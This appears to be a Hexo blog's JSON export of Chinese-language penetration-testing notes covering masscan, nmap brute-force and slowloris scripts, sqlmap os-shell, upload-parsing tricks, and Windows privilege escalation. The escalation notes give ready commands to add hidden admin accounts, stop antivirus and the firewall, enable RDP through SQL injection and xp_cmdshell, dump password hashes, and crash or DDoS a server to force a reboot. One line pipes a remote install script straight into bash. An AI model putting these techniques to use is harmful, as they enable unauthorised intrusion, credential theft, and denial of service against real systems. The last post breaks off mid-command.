{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"","slug":"masscan使用参数记录","date":"2024-03-15T07:06:53.626Z","updated":"2024-03-15T07:07:28.246Z","comments":true,"path":"2024/03/15/masscan使用参数记录/","permalink":"http://example.com/2024/03/15/masscan%E4%BD%BF%E7%94%A8%E5%8F%82%E6%95%B0%E8%AE%B0%E5%BD%95/","excerpt":"","text":"端口扫描工具（masscan）使用参数扫描指定网段范围的指定端口123copymasscan -p80,8080-8100 10.0.0.0/8 （扫描10.x.x.x子网，扫描端口80和8000-8100范围的端口段） 获取Banner1copymasscan 10.0.0.0/8 -p80 --banners --source-ip x.x.x.x 扫描10.x.x.x网段80端口的开放信息，并且获取banner信息。–source-ip 是指定源IP，这个ip必须指定独立有效的IP地址。 设置扫描时忽略一些网段1copymasscan 0.0.0.0/0 -p0-65535 --excludefile exclude.txt 输出到指定文件中1copymasscan 0.0.0.0/0 -p0-65535 -oX scanRes.xml 设置扫描速度1copymasscan 0.0.0.0/0 -p0-65535 --max-rate 100000 命令行模式详细参数 &lt;ip&#x2F;range&gt; IP地址范围，有三种有效格式，1、单独的IPv4地址 2、类似”10.0.0.1-10.0.0.233”的范围地址 3、CIDR地址 类似于”0.0.0.0&#x2F;0”，多个目标可以用都好隔开 -p &lt;ports,–ports &gt; 指定端口进行扫描 –banners 获取banner信息，支持少量的协议 –rate 指定发包的速率 -c , –conf 读取配置文件进行扫描 –echo 将当前的配置重定向到一个配置文件中 -e , –adapter 指定用来发包的网卡接口名称 –adapter-ip 指定发包的IP地址 –adapter-port 指定发包的源端口 –adapter-mac 指定发包的源MAC地址 –router-mac 指定网关的MAC地址 –exclude &lt;ip&#x2F;range&gt; IP地址范围黑名单，防止masscan扫描 –excludefile 指定IP地址范围黑名单文件 –includefile，-iL 读取一个范围列表进行扫描 –ping 扫描应该包含ICMP回应请求 –append-output 以附加的形式输出到文件 –iflist 列出可用的网络接口，然后退出 –retries 发送重试的次数，以1秒为间隔 –nmap 打印与nmap兼容的相关信息 –http-user-agent 设置user-agent字段的值 –show [open,close] 告诉要显示的端口状态，默认是显示开放端口 –noshow [open,close] 禁用端口状态显示 –pcap 将接收到的数据包以libpcap格式存储 –regress 运行回归测试，测试扫描器是否正常运行 –ttl 指定传出数据包的TTL值，默认为255 –wait 指定发送完包之后的等待时间，默认为10秒 –offline 没有实际的发包，主要用来测试开销 -sL 不执行扫描，主要是生成一个随机地址列表 –readscan 读取从-oB生成的二进制文件，可以转化为XML或者JSON格式. –connection-timeout 抓取banners时指定保持TCP连接的最大秒数，默认是30秒。","categories":[],"tags":[]},{"title":"","slug":"docker部署","date":"2024-03-15T07:05:53.969Z","updated":"2024-03-15T08:03:02.956Z","comments":true,"path":"2024/03/15/docker部署/","permalink":"http://example.com/2024/03/15/docker%E9%83%A8%E7%BD%B2/","excerpt":"","text":"docker一键安装部署AWVS1234copydocker pull quay.io/hiepnv/acunetix:15.2 &amp;&amp; docker volume create acunetix_data &amp;&amp; docker run -d -p 3443:3443 --restart=unless-stopped --name=acunetix_web quay.io/hiepnv/acunetix用户名：admin@acu.com密码：Passw0rd!https://localhost:3443/#/login Nessus1234567891011copydocker run -itd --name=ramisec_nessus -p 8834:8834 ramisec/nessus#更新docker exec -it ramisec_nessus /bin/bash /nessus/update.sh#更改密码docker exec -it ramisec_nessus bash# 进入这个目录cd /opt/nessus/sbin# 列出登录用户nessuscli lsuser# 修改指定用户的密码（以admin为例）nessuscli chpasswd admin 佩奇文库1234copydocker search peiqipeiqidocker pull peiqipeiqi/peiqi_wiki:220420docker run -t -d -p 65534:80 --name &quot;PeiQi_Wiki&quot; peiqipeiqi/peiqi_wiki:220420User/Pass: peiqi:peiqi (手动更新:进入Docker执行命令，/usr/share/nginx/html/synchronous.sh) 国内镜像Docker中国区官方镜像https://registry.docker-cn.com中国科学技术大学https://docker.mirrors.ustc.edu.cn 网易 http://hub-mirror.c.163.com腾讯https://mirror.ccs.tencentyun.com 反弹shell12docker build -t reverse_shell_generator .docker run -d -p 80:80 reverse_shell_generator mklink &#x2F;J “C:\\Program Files\\Docker” “D:\\software\\Docker”mklink &#x2F;J “C:\\Users\\Lenovo\\AppData\\Local\\Docker” “D:\\Users\\Lenovo\\AppData\\Local\\Docker”","categories":[],"tags":[]},{"title":"","slug":"nslookup学习笔记","date":"2024-03-15T07:05:09.688Z","updated":"2024-03-15T07:05:40.194Z","comments":true,"path":"2024/03/15/nslookup学习笔记/","permalink":"http://example.com/2024/03/15/nslookup%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"nslookup命令笔记1234567891011copy1.主机记录（A记录）： A记录是用于名称解析的重要记录，提供标准的主机名到IP的地址映射。2.别名记录（CNAME记录）： 向查询的主机提供主机名对应的规范主机名。3.域名服务器记录（NS记录）： 用来指定该域名由哪个DNS服务器来进行解析。 您注册域名时，总有默认的DNS服务器，每个注册的域名都是由一个DNS域名服务器来进行解析的，DNS服务器NS记录地址一般以以下的形式出现： ns1.domain.com、ns2.domain.com等。简单的说，NS记录返回域中主机IP地址的权威DNS服务器的主机名。4.邮件交换记录（MX记录）： 返回别名为Name对应的邮件服务器的规范主机名。 5.soa soa叫做起始授权机构记录，主dns服务器 nslookup 查询a记录1copynslookup -type=a xxxxx nslookup 查询soa记录1copynslookup -type=soa xxx nslookup 查询域传送漏洞123copynslookupserver 主dns服务器地址ls xxx dig123456copy1.查询a记录 dig xxx a2.查询soa记录 dig xxx soa3.查询域传送漏洞 dig axfr @主dns服务器地址 xxx 查询是否dnshttps：&#x2F;&#x2F;ping.chinaz.com&#x2F;","categories":[],"tags":[]},{"title":"","slug":"shadow","date":"2024-03-15T07:01:44.125Z","updated":"2024-03-15T07:02:14.557Z","comments":true,"path":"2024/03/15/shadow/","permalink":"http://example.com/2024/03/15/shadow/","excerpt":"","text":"123wget --no-check-certificate -O shadowsocks.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.shchmod +x shadowsocks.sh 1bash &lt;(wget -qO- https://raw.githubusercontent.com/sing-web/x-ui/main/install_CN.sh)","categories":[],"tags":[]},{"title":"","slug":"学习笔记","date":"2024-02-26T02:26:03.456Z","updated":"2021-12-15T07:57:41.542Z","comments":true,"path":"2024/02/26/学习笔记/","permalink":"http://example.com/2024/02/26/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"doss攻击 使用防火墙，处理非正常三次握手 cc攻击 代理 用来消耗服务器资源的 12345678C:\\Users\\86157&gt;tasklist|findstr &quot;18424&quot;java.exe 18424 Console 2 1,851,656 KC:\\Users\\86157&gt;taskkill /f /t /im java.exe成功: 已终止 PID 5284 (属于 PID 18424 子进程)的进程。成功: 已终止 PID 2320 (属于 PID 14516 子进程)的进程。成功: 已终止 PID 18424 (属于 PID 14520 子进程)的进程。成功: 已终止 PID 14516 (属于 PID 6776 子进程)的进程。 nikto -h web应用漏洞扫描器 子域名收集1234567工具： SubDomainBrute OneForAll ct-exposer Layer子域名爆破机goodle hacking intitle：xx 域名转IP判断CDN1234在线cdn检测 对于存在cdn的，需要绕过cdn查找真实的ip 1.测试真实ip的是否开放了高危端口 2.通过c段进行扫描发现其他资产 通过ip查找网段云溪cms识别12https://www.yunsee.cn/ nmap使用1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162TCP: -sTSYN: -sSACK: -sAUDP: -sURPC: -sRICMP: -sPdisable port scan: -snnmap -sn -PR 192.168.0.0/24 arp扫描1.扫描包含主机列表的文件中的所有地址nmap -iL 2.扫描除了一个目标地址之外的所有地址nmap ip -exclude ip3.指定端口nmap ip -p xx4.对目标地址进行路由跟踪nmap --traceroute ip5.IIS 短文件泄露nmap -p 8080 --script http-iis-short-name-brute 192.168.1.16.拒绝服务nmap --max-parallelism 800--script http-slowloris www.cracer.com7.验证http 中开启了put 方法nmap --script http-put --script-args http-put.url=/uploads/testput.txt,http-put.file=/root/put.txt 218.19.141.168.验证MySQL 匿名访问nmap --script mysql-empty-password 203.195.139.1539.防火墙躲避-f 分片绕过-D使用诱饵隐蔽扫描NMAP -D 1.1.1.1,222.222.222.222 www.cracer.com--source-port 源端口欺骗10.对目标进行IP反查nmap -sn --script hostmap-ip2hosts www.hao123.com11.对目标DNS信息的收集nmap --script dns-brute www.test.comnmap --script dns-brute dns-brute.threads=10 www.test.com12.了解目标系统的详细信息nmap -p 445 192.168.23.1 --script membase-http-info13.检查打印服务漏洞nmap --script smb-security-mode.nse -p 445 192.168.21.314.扫描目标的xss漏洞nmap -p80 --script http-stored-xss.nse www.test.com15.扫描目标的SQL注入漏洞nmap -p8001 --script http-sql-injection.nse 192.168.0.20016.识别服务namp -sV --script unusual-port ip 17.注入脚本nmap -p8001 --script http-sql-injection.nse ip18.扫描系统漏洞nmap --script vuln 192.168.1.119.对目标地址进行HTTP头信息探测nmap -p 80 --script=http-headers test.com20.爬行web目录结构nmap -p 80 --script=http-sitemap-generator www.test.com21.Snmp服务获取目标正在运行着的服务，通过Snmp服务对目标系统的服务或账户进行列举nmap -sU -p 161 --script=snmp-win32-services 192.168.87.12922.暴力破解VNCnmap --script vnc-brute --script-args brute.guesses=6,brute.emptypass=true,userdb=/root/dictionary/user.txt,brute.useraspass=true,passdb=/root/dictionary/pass.txt,brute.retries=3,brute.threads=2,brute.delay=3 42.96.170.12823.破解telnetnmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst --script-args telnet-brute.timeout=8s 192.168.1.124.ftp弱口令暴力破解nmap --script ftp-brute --script-args brute.emptypass=true,ftp-brute.timeout=30,userdb=/root/dirtionary/usernames.txt,brute.useraspass=true,passdb=/root/dirtionary/passwords.txt,brute.threads=3,brute.delay=6 192.168.1.1 端口扫描12routescan、御剑高速TCP全端口nmap ，慢 sqlmap123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113is-dba 当前用户权限dbs 所有数据库current-db 网站当前数据库users 所有数据库用户current-user 当前数据库用户tables 参数:列表名columns 参数:列字段dump 参数:下载数据--dump 获取表中的数据，包含列 --dump-all 转存DBMS数据库所有表项目--level 测试等级(1-5)，默认为1读取数据库---&gt;读取表----&gt;读取表的列----&gt;获取内容-D 指定数据库-T 指定表-C 指定列--dbms=mysql oracle mssql 指定数据库--users 枚举所有用户--passwords 枚举所有用户密码--roles 列出数据库管理员角色--privileges 列出数据库管理员权限列举数据库系统的架构sqlmap.py -u &quot;http://xx.com/int.php?id=1&quot; --schema --batch --exclude-sysdbs--level共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。-v 显示调试信息 有7个级别0、只显示python错误以及严重的信息。1、同时显示基本信息和警告信息。（默认）2、同时显示debug信息。3、同时显示注入的payload。4、同时显示HTTP请求。5、同时显示HTTP响应头。6、同时显示HTTP响应页面。--risk共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。从文本中获取多个目标扫描参数：-m-g测试注入Google的搜索结果中的GET参数（只获取前100个结果）。python sqlmap.py -g &quot;inurl:php?id=&quot;把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。python sqlmap.py -u “http://www.cracer.com/cracer.php” --data=“id=1”加入cookie注入测试sqlmap -u &quot;http://www.ntjx.org/jsj/DownloadShow.asp&quot; --cookie &quot;id=9&quot; --table --level 2--referersqlmap可以在请求中伪造HTTP中的referer，当--level参数设定为3或者3以上的时候会尝试对referer注入。--headers可以通过--headers参数来增加额外的http头--hearders “client-ip: 1.1.1.1&#x27;”--proxy使用--proxy代理是格式为：http://url:port。--proxy=http://127.0.0.1:1080--proxy-file c:/1.txt--delay可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。--timeout可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。设定重试超时--retries当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。设定随机改变的参数值--batch用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。--identify-wafsqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。--check-wafWAF/IPS/IDS保护可能会对sqlmap造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。 sqlmap将会使用一个不存在的参数来注入测试--common-tables当使用--tables无法获取到数据库的表时，可以使用此参数。通常是如下情况：1、MySQL数据库版本小于5.0，没有information_schema表。2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。3、当前用户没有权限读取系统中保存数据结构的表的权限。暴力破解的表在txt/common-tables.txt文件中，你可以自己添加。--time-sec当使用继续时间的盲注时，时刻使用--time-sec参数设定延时时间，默认是5秒--sql-query=&quot;select @@version&quot;--sql-shellsqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。从数据库服务器中读取文件参数：--file-read当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。参数：--file-write,--file-dest当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。--os-cmd,--os-shell当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。cmd 执行cmd命令（win）shell 执行当前用户命令 --os-shell自动上传 脚本文件返回shell searchsploit 漏洞缓存库它将搜索所有的漏洞和shellcode。 1234567891011121314151617181920212223242526apt-get install searchsploit1.查找windows本地提权漏洞searchsploit -t windows local-m可以将脚本复制到当前路径基本搜索会同时匹配标题和路径中的内容如:searchsploit smb windows remote标题搜索标题搜索只匹配标题,不会对路径中的关键词进行匹配如:searchsploit -t smb windows remote删除不想要的结果使用--exclude=选项删除不想要的结果如:searchsploit smb windows remote --exclude=&quot;(POC)|txt&quot;利用管道输出(删除不想要的结果的另一种方法)如:searchsploit smb windows remote | grep rb 只显示rb文件复制到剪贴板-p参数可以获取更多关于该漏洞的信息,以及将完整的路径复制到剪贴板上(如果可能的话)如:searchsploit -p 42315.py复制到文件夹不建议在本地的漏洞数据库中修改exp,建议使用-m参数复制那些有用的到当前的工作目录如:searchsploit -m 42315.py联网搜索一些开发的元数据没有保存在本地，如果要访问他们，需要联网搜索如:searchsploit eternalblue -w XRAY使用其他工具爬取，xray爬取速度慢 cmd 命令被动扫描 123456789101112131415161718 1.使用基础爬虫爬取爬虫爬取的链接进行漏洞扫描xray webscan --basic-crawler http://example.com --html-output vuln.html 2.使用HTTP代理进行被动扫描xray webscan --listen 127.0.0.1:7777 --html-output proxy.html设置浏览器http代理为http://127.0.0.1:7777，就可以自动分析代理流量并扫描。浏览下载https流量，请阅读世界文档抓取 https 流量部分 3.只扫描一个网址，不使用爬虫xray 网络扫描 --url http://example.com/ ? a=b --html-output single-url.html 4.手动指定本次运行的插件默认情况下，将会启用所有内置插件，可以使用以下命令指定本次扫描的插件。xray webscan --plugins cmd-injection,sqldet --url http://example.comxray webscan --plugins cmd-injection,sqldet --listen 127.0.0.1:7777 5.指定插件输出可以指定将本次扫描的漏洞信息输出到某个文件中：xray 网络扫描 --url http://example.com/ ? a=b \\--text-output result.txt --json-output result.json --html-output report.html 配合burp12341.使用HTTP代理进行被动扫描xray webscan --listen 127.0.0.1:7777 --html-output proxy.html2.exp.py3.burn监听7777 GOBY1配合xray，msf使用 设置代理 扫内网的漏洞 BURP1234~~~~## 上传，解析漏洞 IIS 5.x&#x2F;6.0解析漏洞IIS 6.0解析利用方法有两种1.目录解析&#x2F;xx.asp&#x2F;xx.jpg2.文件解析cracer.asp;.jpg ###iis 7.0以上#####&#x2F;.php apache解析漏洞x.php.xxxxPhtmlPhp3Php4php5X.phtmlPhp空格Php_PHP 在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入:&lt;FilesMatch “*.jpg “&gt; SetHandler application&#x2F;x-httpd-php 然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件 Nginx 空字节代码执行漏洞影响版:0.5.,0.6., 0.7 &lt;&#x3D; 0.7.65, 0.8 &lt;&#x3D; 0.8.37Nginx在图片中嵌入PHP代码然后通过访问xxx.php%00.jpg来执行其中的代码 Nginx文件名逻辑漏洞(CVE-2013-4547)受影响的nginx版本: 0.8.41至1.4.3和1.5.7之前的1.5.x正常上传一个附加代码的图片”test.jpg”，访问时后面+”空格”+”\\0”+”.php”，即让图片作为php文件解析“&#x2F;test.jpg \\0.php“Test.jpg&#x2F;.php nginx畸形解析漏洞默认fast-cgi开启状况下，在一个文件路径后面加上&#x2F;xx.php会将原来的文件解析为php文件将shell语句，如","categories":[],"tags":[]},{"title":"CDN学习笔记","slug":"CDN绕过","date":"2024-02-26T02:25:33.735Z","updated":"2024-03-15T07:11:53.050Z","comments":true,"path":"2024/02/26/CDN绕过/","permalink":"http://example.com/2024/02/26/CDN%E7%BB%95%E8%BF%87/","excerpt":"","text":"CDN学习笔记1CDN即内容分发网络，起初是为了提高网络的通讯效率，后被用于IP的隐藏技术。 CDN绕过方法1234567891011121314151617181. dns解析 使用nslookup 网址 ip2. 不同的ip地域多次ping 有些CDN可能只对国内的IP加装了CDN流量分发，而没有对其他地域加CDN3. 使用搜索引擎 shoda，钟馗，qianx4. rss订阅搜寻5. zmap https://linux.cn/article-5860-1.html6. 网站证书查询，whois挖掘全面域名相关信息 网址查询参考： 真实IP查询：https://www.ipip.net/ip.html 超级ping检测是否存在cdn：https://ping.aizhan.com/ 站长超级ping检测：http://ping.chinaz.com/ 网站数据挖掘参考：https://sitereport.netcraft.com/ 端口多种检测，IP查询参考：https://viewdns.info/ cdn检测地域范围：http://www.17ce.com/ 指纹信息查询：http://finger.tidesec.com/","categories":[],"tags":[]},{"title":"提权学习笔记收录","slug":"提权","date":"2024-02-26T02:25:19.103Z","updated":"2022-04-08T17:10:01.963Z","comments":true,"path":"2024/02/26/提权/","permalink":"http://example.com/2024/02/26/%E6%8F%90%E6%9D%83/","excerpt":"","text":"web提权1234567891011121314151617181920212223242526272829303132333435363738394041424344451.能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行/c c:windowstempcookiesnet1.exe user2.当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。3.cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，cmd.exe/cmd.com/cmd.txt 都可以。4.cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权。6.c:windowstempcookies 这个目录7.找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索，超方便！8.cmd执行exp没回显的解决方法：com路径那里输入exp路径C:RECYCLERpr.exe，命令那里清空(包括/c )输入”net user jianmei daxia /add”9.增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了。10.有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可。11.有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程12.其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了。13.用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令。14.提权很无奈的时候，可以试试TV远控，通杀内外网，穿透防火墙，很强大的。15. 当可读可写目录存在空格的时候，会出现这样的情况：’C:Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如：Cd C:Documents and SettingsAll UsersApplication DataMicrosoft 目录然后再执行exp或者cmd，就不会存在上面的情况了，aspshell一般是无法跳转目录的～16.有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators17.进入服务器，可以继续内网渗透 这个时候可以尝试打开路由器 默认帐号密码 admin admin18.有的cmd执行很变态，asp马里，cmd路径填上面，下面填：””c:xxxexp.exe “whoami” 记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在cmd那里，下面不变。19.一般增加不上用户，或是想添加增加用户的vbs,bat,远控小马到服务器的启动项里，用“直接使服务器蓝屏重启的东东”这个工具可以实现，20.执行PwDump7.exe抓哈希值的时候，建议重定向结果到保存为1.txt /c c:windowstempcookiesPwDump7.exe &gt;1.txt21.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:windowstempcmd.exe 设置终端路径为：c:windowstempcmd.exe22.当不支持aspx，或是支持但跨不了目录的时候，可以上传一个读iis的vps，执行命令列出所有网站目录，找到主站的目录就可以跨过去了。上传cscript.exe到可执行目录，接着上传iispwd.vbs到网站根目录，cmd命令/c “c:windowstempcookiescscript.exe” d:webiispwd.vbs23.如何辨别服务器是不是内网？192.168.x.x 172.16.x.x 10.x.x.x dos命令大全12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364查看版本：ver查看权限：whoami查看配置：systeminfo查看用户：net user查看进程：tasklist查看正在运行的服务：tasklist /svc查看开放的所有端口：netstat -ano查询管理用户名：query user查看搭建环境：ftp 127.0.0.1查看指定服务的路径：sc qc Mysql添加一个用户：net user jianmei daxia.asd /add提升到管理权限：net localgroup administrators jianmei /add添加用户并提升权限：net user jianmei daxia.asd /add &amp; net localgroup administrators jianmei /add查看制定用户信息：net user jianmei查看所有管理权限的用户：net localgroup administrators加入远程桌面用户组：net localgroup “Remote Desktop Users” jianmei /add突破最大连接数：mstsc /admin /v:127.0.0.1删除用户：net user jianmei /del删除管理员账户:net user administrator daxia.asd更改系统登陆密码：net password daxia.asd激活GUEST用户：net user guest /active:yes开启TELNET服务：net start telnet关闭麦咖啡：net stop “McAfee McShield”关闭防火墙：net stop sharedaccess查看当前目录的所有文件：dir c:windows查看制定文件的内容：type c:windows1.asp把cmd.exe复制到c:windows的temp目录下并命名为cmd.txt：copy c:windowstempcookiescmd.exe c:windowstempcmd.txt开3389端口的命令：REG ADD HKLMSYSTEMCurrentControlSetControlTerminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f查 看补丁：dir c:windows&gt;a.txt&amp;(for %i in (KB952004.log KB956572.log KB2393802.log KB2503665.log KB2592799.log KB2621440.log KB2160329.log KB970483.log KB2124261.log KB977165.log KB958644.log) do @type a.txt|@find /i “%i”||@echo %i Not Installed!)&amp;del /f /q /a a.txt SQL语句直接开启338912345678910111213141516173389登陆关键注册表位置：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\DenyTSConnections其中键值DenyTSConnections 直接控制着3389的开启和关闭，当该键值为0表示3389开启，1则表示关闭。而MSSQL的xp_regwrite的存储过程可以对注册进行修改，我们使用这点就可以简单的修改DenyTSConnections键值，从而控制3389的关闭和开启。开启3389的SQL语句：syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\\CurrentControlSet\\Control\\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;–关闭3389的SQL语句：syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\\CurrentControlSet\\Control\\Terminal Server ’,’fDenyTSConnections’,’REG_DWORD’,1;– 常见杀软123456789360tray.exe 360实时保护ZhuDongFangYu.exe 360主动防御KSafeTray.exe 金山卫士McAfee McShield.exe 麦咖啡SafeDogUpdateCenter.exe 服务器安全狗 windows提权中敏感目录和敏感注册表的利用12345678910111213141516171819敏感目录 目录权限 提权用途C:Program Files 默认用户组users对该目录拥有查看权 可以查看服务器安装的应用软件C:Documents and SettingsAll Users「开始」菜单程序 Everyone拥有查看权限 存放快捷方式，可以下载文件，属性查看安装路径C:Documents and SettingsAll UsersDocuments Everyone完全控制权限 上传执行cmd及expC:windowssystem32inetsrv Everyone完全控制权限 上传执行cmd及expC:windowsmy.iniC:Program FilesMySQLMySQL Server 5.0my.ini 默认用户组users拥有查看权限 安装mysql时会将root密码写入该文件C:windowssystem32 默认用户组users拥有查看权限 Shift后门一般是在该文件夹，可以下载后门破解密码C:Documents and SettingsAll Users「开始」菜单程序启动 Everyone拥有查看权限 可以尝试向该目录写入vbs或bat，服务器重启后运行。C:RECYCLERD:RECYCLER Everyone完全控制权限 回收站目录。常用于执行cmd及expC:Program FilesMicrosoft SQL Server 默认用户组users对该目录拥有查看权限 收集mssql相关信息，有时候该目录也存在可执行权限C:Program FilesMySQL 默认用户组users对该目录拥有查看权限 找到MYSQL目录中user.MYD里的root密码C:oraclexe 默认用户组users对该目录拥有查看权限 可以尝试利用Oracle的默认账户提权C:WINDOWSsystem32config 默认用户组users对该目录拥有查看权限 尝试下载sam文件进行破解提权C:Program FilesGeme6 FTP ServerRemote AdminRemote.ini 默认用户组users对该目录拥有查看权限 Remote.ini文件中存放着G6FTP的密码c:Program FilesRhinoSoft.comServ-Uc:Program FilesServ-U 默认用户组users对该目录拥有查看权限 ServUDaemon.ini 中存储了虚拟主机网站路径和密码c:windowssystem32inetsrvMetaBase.xml 默认用户组users对该目录拥有查看权限 IIS配置文件C:tomcat5.0confresin.conf 默认用户组users对该目录拥有查看权限 Tomat存放密码的位置C:ZKEYSSetup.ini 默认用户组users对该目录拥有查看权限 ZKEYS虚拟主机存放密码的位置 **提权中的敏感注册表位置 **123456789101112HKEY_LOCAL_MACHINESOFTWAREMicrosoftMSSQLServerMSSQLServerSuperSocketNetLibTcp Mssql端口HKLMSYSTEMCurrentControlSetControlTerminal Server DenyTSConnections 远程终端 值为0 即为开启HKEY_LOCAL_MACHINESOFTWAREMySQL AB mssql的注册表位置HKEY_LOCAL_MACHINESOFTWAREHZHOSTCONFIG 华众主机注册表配置位置HKEY_LOCAL_MACHINESOFTWARECat SoftServ-UDomains1UserList serv-u的用户及密码（su加密）位置HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminalServer WinStationsRDP-Tcp 在该注册表位置PortNumber的值即位3389端口值HKEY_CURRENT_USERSoftwarePremiumSoftNavicatServers mysql管理工具Navicat的注册表位置，提权运用请谷歌HKEY_LOCAL_MACHINESYSTEMRAdminv2.0ServerParameters Radmin的配置文件，提权中常将其导出进行进行覆盖提权HKEY_LOCAL_MACHINESYSTEMControlSet002ServicesMSFtpsvcParametersVirtual Roots IIS注册表全版本泄漏用户路径和FTP用户名漏洞HKEY_LOCAL_MACHINEsoftwarehzhostconfigSettingsmastersvrpass 华众主机在注册表中保存的mssql、mysql等密码HKEY_LOCAL_MACHINESYSTEMLIWEIWENSOFTINSTALLFREEADMIN11 星外主机mssql的sa账号密码，双MD5加密HKEY_LOCAL_MACHINESYSTEMControlSet002ServicesMSFtpsvcParametersVirtual RootsControlSet002 星外ftp的注册表位置，当然也包括ControlSet001、ControlSet003 **wscript.shell的删除和恢复 **1234567载wscript.shell对象，在cmd下或直接运行：regsvr32 /u %windir%system32WSHom.Ocx卸载FSO对象，在cmd下或直接运行：regsvr32.exe /u %windir%system32scrrun.dll卸载stream对象，在cmd下或直接运行：regsvr32 /s /u “C:ProgramFilesCommonFilesSystemadomsado15.dll”如果想恢复的话只需要去掉/U 即可重新再注册以上相关ASP组件，这样子就可以用了 如何找到准确的终端连接端口？1234567891011在aspx大马里，点击“系统信息”第三个就是目前的3389端口或是执行命令查看正在运行的服务：tasklist /svc找到：svchost.exe 1688 TermService记住1688这个ID值，查看开放的所有端口：netstat -ano找到1688这个ID值所对应的端口就是3389目前的端口 **iis6提权提示Can not find wmiprvse.exe的突破方法 **1234567891011121314151617181920windows2003 iis6iis7在windows2008以上突破方法一：在IIS环境下，如果权限做得不严格，我们在aspx大马里面是有权限直接结束wmiprvse.exe进程的，进程查看里面直接K掉在结束之后，它会再次运行，这时候的PID值的不一样的。这时候我们回来去运行exp，直接秒杀。突破方法二：虚拟主机，一般权限严格限制的，是没权限结束的，这时候我们可以考虑配合其他溢出工具让服务器强制重启，比如“直接使服务器蓝屏重启的东东”甚至可以暴力点，DDOS秒杀之，管理发现服务器不通了首先肯定是以为服务器死机，等他重启下服务器（哪怕是IIS重启下）同样秒杀之。 **本地溢出提权 **1234567计算机有个地方叫缓存区,程序的缓存区长度是被事先设定好的,如果用户输入的数据超过了这个缓存区的长度,那么这个程序就会溢出了.缓存区溢出漏洞主要是由于许多软件没有对缓存区检查而造成的.利用一些现成的造成溢出漏洞的exploit通过运行,把用户从users组或其它系统用户中提升到administrators组.想要执行cmd命令，就要wscript.shell组建支持，或是支持aspx脚本也行，因为aspx脚本能调用.net组件来执行cmd的命令. sa提权 -windows。。sqlserver只能用于windows12345678910扫描开放的端口，1433开了就可以找sa密码提权，用大马里的搜索文件功能，sa密码一般在conn.asp config.asp web.config 这三个文件也可以通过注册表找配置文件，看下支持aspx不，支持的话跨目录到别的站点上找，找到之后用aspshell自带的sql提权登录再执行命令创建用户即可。aspx马提权执行命令有点不一样，点击数据库管理–选MSSQL–server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB–输入帐号密码连接即可增加一个用户：exec master.dbo.xp_cmdshell ‘net user jianmei daxia.asd /add’;–提升为管理员：exec master.dbo.xp_cmdshell ‘net localgroup administrators jianmei 